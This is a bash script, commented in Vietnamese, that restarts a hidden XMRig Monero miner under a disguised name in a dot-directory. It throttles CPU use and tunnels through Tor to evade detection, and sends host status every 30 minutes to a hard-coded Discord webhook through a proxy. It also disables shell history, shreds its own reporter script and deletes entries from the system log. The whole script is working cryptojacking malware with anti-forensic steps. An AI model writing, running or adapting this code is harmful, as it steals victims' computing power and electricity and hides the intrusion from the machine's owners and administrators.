#!/bin/bash
# Tận dụng XMRig đã cài từ miner_v3.sh và tối ưu hóa ẩn danh

# ========== CONFIG ==========
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
POOL="pool.hashvault.pro:443"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vtSNXOhRKQcinbADhtbsM720wiN3WEkYm1wZbL30D0GD9P84d1VF9xaCoVdK"
WORKER="silent_$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"

INSTALL_DIR="$HOME/.local/share/.cache/.dbus"
CUSTOM_NAME=$(ls $INSTALL_DIR | grep -v logminer.sh | head -n1) # Lấy tên binary đã cài
LOG_FILE="/dev/null" # Tắt logging
# ============================

# Tắt lịch sử lệnh
unset HISTFILE

# Kiểm tra xem XMRig binary có tồn tại không
if [ ! -f "$INSTALL_DIR/$CUSTOM_NAME" ]; then
  echo "❌ Không tìm thấy XMRig binary. Vui lòng chạy lại script miner_v3.sh."
  exit 1
fi

# Giảm số luồng CPU để tránh phát hiện
TOTAL_CORES=$(nproc)
CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.5)}")
PRIORITY=1

# Tạm dừng miner nếu CPU cao
CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print $2 + $4}')
if [ $(echo "$CPU_USAGE > 80" | bc -l) -eq 1 ]; then
  pkill -f $CUSTOM_NAME
  sleep 300
fi

# Khởi động lại miner nếu không chạy
if ! pgrep -f $CUSTOM_NAME > /dev/null; then
  torsocks nohup $INSTALL_DIR/$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \
    --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \
    --max-cpu-usage=50 --log-file=$LOG_FILE &
fi

# Tạo script gửi log hiệu suất (ẩn danh hơn)
tee "$INSTALL_DIR/logminer.sh" > /dev/null << EOF
#!/bin/bash
WEBHOOK="$DISCORD_WEBHOOK"
HOST="\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
HASHRATE="Unknown"

CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
UPTIME=\$(uptime -p)

curl -s -x socks5://<proxy_ip>:<port> -H "Content-Type: application/json" -X POST -d "{
  \\"username\\": \\"System Status\\",
  \\"content\\": \\"📟 Host: \\\`\$HOST\\\`\\n💨 Hashrate: \\\`\$HASHRATE\\\`\\n Models: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
}" "\$WEBHOOK" > /dev/null 2>&1
EOF

chmod +x "$INSTALL_DIR/logminer.sh"

# Tạo vòng lặp gửi log thay vì cron (giảm dấu vết)
nohup bash -c "while true; do $INSTALL_DIR/logminer.sh; sleep 1800; done" &

# Xóa dấu vết
shred -u $INSTALL_DIR/logminer.sh 2>/dev/null
history -c && history -w
sudo sed -i "/$CUSTOM_NAME/d" /var/log/syslog 2>/dev/null

echo "✅ Miner đang chạy ẩn danh, log gửi mỗi 30 phút! 🚀"
